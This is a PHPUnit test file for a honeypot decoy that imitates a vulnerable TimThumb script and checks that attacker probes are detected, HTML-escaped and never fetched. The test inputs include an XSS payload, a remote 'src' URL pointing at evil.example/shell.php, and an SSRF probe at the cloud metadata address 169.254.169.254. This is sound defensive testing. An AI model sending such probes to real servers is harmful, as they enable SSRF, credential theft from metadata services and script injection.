<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\Config;
use Funnypot\Core\Honeypot;
use Funnypot\Core\RequestContext;
use Funnypot\Core\Response\Style;
use Funnypot\Core\SiteProfile;
use Funnypot\Core\Template\TemplateAttackEmulator;
use Funnypot\Core\Verdict;
use PHPUnit\Framework\TestCase;

/**
 * The TimThumb RCE/SSRF decoy (attack rule 111). Drives the COMPILED attack rule against a live
 * RequestContext so assertions run on production bytes, not a fixture:
 *  - a bare GET on any timthumb.php/thumb.php variant serves the vulnerable-version audit banner;
 *  - a ?src=/?webshot= probe raises a high finding AND reflects the query HTML-ESCAPED (not the path);
 *  - the handler is SSRF-safe by construction — it captures + reflects + returns a canned page, with
 *    no HTTP client / socket / DNS / file I/O in core to fetch the attacker's src.
 */
final class TimThumbDecoyTest extends TestCase
{
    private const COMPILED = __DIR__ . '/../resources/compiled/funnypot-attack.php';

    private function emulator(): TemplateAttackEmulator
    {
        return TemplateAttackEmulator::fromFile(self::COMPILED);
    }

    /** Drive one request through the compiled rules. */
    private function serve(string $method, string $path, string $query = ''): ?object
    {
        return $this->emulator()->emulate(new RequestContext($method, $path, $query, [], null));
    }

    /** Full engine over the merged store, to observe classification severity + tags. */
    private function fullEngine(): Honeypot
    {
        $store = new \Funnypot\Core\Store\PhpArrayStore(
            require __DIR__ . '/../resources/compiled/nuclei-index.full.php'
        );
        $config = new Config(
            'detect', null, 'matched-only', null, 'coherent', Style::MINIMAL,
            'high', 65536, 0, 0, true /* attackEmulation */
        );

        return new Honeypot($store, $config);
    }

    // --- the rule compiled and is reachable -------------------------------------------------

    public function test_rule_compiled_with_id_and_tags(): void
    {
        $rules = require self::COMPILED;
        $byId = [];
        foreach ($rules as $r) {
            $byId[(string) $r['id']] = $r;
        }
        self::assertArrayHasKey('attack-timthumb', $byId, 'the timthumb rule must be in the compiled attack file');
        self::assertSame('high', $byId['attack-timthumb']['severity']);
        self::assertContains('timthumb', $byId['attack-timthumb']['tags']);
        self::assertContains('ssrf', $byId['attack-timthumb']['tags']);
    }

    // --- baseline: bare GET on the path variants --------------------------------------------

    public function test_bare_get_serves_the_vulnerable_version_banner(): void
    {
        $r = $this->serve('GET', '/timthumb.php');
        self::assertNotNull($r);
        self::assertSame(200, $r->status);
        self::assertStringContainsString('A TimThumb error has occured', $r->body);
        self::assertStringContainsString('TimThumb version : 2.8.13', $r->body);
        self::assertStringContainsString('No image specified', $r->body);
        self::assertSame(['attack-timthumb'], $r->satisfies->templateIds());
        self::assertStringContainsString('text/html', $r->headers['Content-Type']);
    }

    public function test_theme_path_variant_serves_the_same_baseline(): void
    {
        // Path regex owns the theme dir — no per-path enumeration needed.
        $r = $this->serve('GET', '/wp-content/themes/twentytwelve/timthumb.php');
        self::assertNotNull($r);
        self::assertStringContainsString('A TimThumb error has occured', $r->body);
        self::assertStringContainsString('TimThumb version : 2.8.13', $r->body);
        self::assertStringContainsString('No image specified', $r->body);
    }

    public function test_plugin_scripts_dir_and_thumb_alias_serve_the_baseline(): void
    {
        // The `thumb.php` alias under a plugin/scripts dir.
        $r = $this->serve('GET', '/wp-content/plugins/foo/scripts/thumb.php');
        self::assertNotNull($r);
        self::assertStringContainsString('A TimThumb error has occured', $r->body);
        self::assertStringContainsString('TimThumb version : 2.8.13', $r->body);
    }

    public function test_non_timthumb_php_does_not_match(): void
    {
        // Segment boundary: /notthumb.php shares the `thumb.php` needle but not the segment.
        self::assertNull($this->serve('GET', '/notthumb.php'));
    }

    // --- MF-1: the query is captured & escaped-reflected, NOT the path -----------------------

    public function test_src_probe_reflects_the_query_html_escaped_not_the_path(): void
    {
        // Literal special chars in the query prove the {{html:match.1}} escape sink and that the
        // reflected value is the QUERY (contains `src=`), never the path segment (the v1 match.0 bug).
        $query = 'src=http://evil.example/"><script>alert(1)</script>&foo=bar';
        $r = $this->serve('GET', '/timthumb.php', $query);
        self::assertNotNull($r);
        self::assertSame(200, $r->status);

        // The external-fetch refusal (exploit branch), not the baseline.
        self::assertStringContainsString('You are not allowed to fetch images from an external website.', $r->body);

        // Reflected value is the QUERY: it carries `src=` (guards the v1 path-reflection bug).
        self::assertStringContainsString('src=http://evil.example', $r->body);
        self::assertStringNotContainsString('Query String : timthumb.php', $r->body);

        // HTML-escaped: markup neutralized.
        self::assertStringContainsString('&lt;script&gt;', $r->body);
        self::assertStringContainsString('&quot;', $r->body);
        self::assertStringContainsString('&amp;foo=bar', $r->body);

        // The raw un-escaped payload must NOT appear verbatim (no reflected XSS).
        self::assertStringNotContainsString('<script>alert(1)</script>', $r->body);
        self::assertStringNotContainsString('"><script>', $r->body);
    }

    public function test_webshot_probe_is_the_exploit_branch_query_escaped(): void
    {
        $query = 'webshot=1&src=http://evil.example/"><b>';
        $r = $this->serve('GET', '/timthumb.php', $query);
        self::assertNotNull($r);
        self::assertStringContainsString('You are not allowed to fetch images from an external website.', $r->body);
        self::assertStringContainsString('webshot=1', $r->body);
        self::assertStringContainsString('&lt;b&gt;', $r->body);
        self::assertStringNotContainsString('"><b>', $r->body);
    }

    // --- classification: high severity + timthumb/ssrf/rce tags ------------------------------

    public function test_src_probe_classifies_high_with_timthumb_tags(): void
    {
        $verdict = $this->fullEngine()->classify(
            new RequestContext('GET', '/timthumb.php', 'src=http://evil.example/shell.php', [], null),
            SiteProfile::empty()
        );
        self::assertSame(Verdict::ATTACK_CLASS, $verdict->classification);
        self::assertContains('attack-timthumb', $verdict->detection->templateIds());
        self::assertSame('high', $verdict->severity);
        $tags = $verdict->detection->tags();
        self::assertContains('timthumb', $tags);
        self::assertContains('ssrf', $tags);
        self::assertContains('rce', $tags);
    }

    // --- SSRF invariant: no outbound I/O; canned page only ----------------------------------

    public function test_src_probe_makes_no_outbound_fetch(): void
    {
        // SSRF-safe BY CONSTRUCTION: the render path takes only a RequestContext + seed and returns a
        // string; there is no HTTP client / socket / DNS resolver / file_get_contents(URL) anywhere in
        // funnypot-core for a `?src=<url>` probe to reach, so there is nothing to mock. Witness: the
        // response is a text/html canned refusal page, never fetched image bytes.
        $r = $this->serve('GET', '/timthumb.php', 'src=http://169.254.169.254/latest/meta-data/');
        self::assertNotNull($r);
        self::assertStringContainsString('text/html', $r->headers['Content-Type']);
        self::assertStringStartsNotWith('GIF8', $r->body);      // no fetched/served image
        self::assertStringStartsNotWith("\x89PNG", $r->body);
        self::assertStringContainsString('You are not allowed to fetch images from an external website.', $r->body);
        // The reflected src is present only as escaped text inside the error page (the internal
        // metadata endpoint was never contacted — its content never appears).
        self::assertStringNotContainsString('ami-id', $r->body);
        self::assertStringNotContainsString('instance-id', $r->body);
    }
}
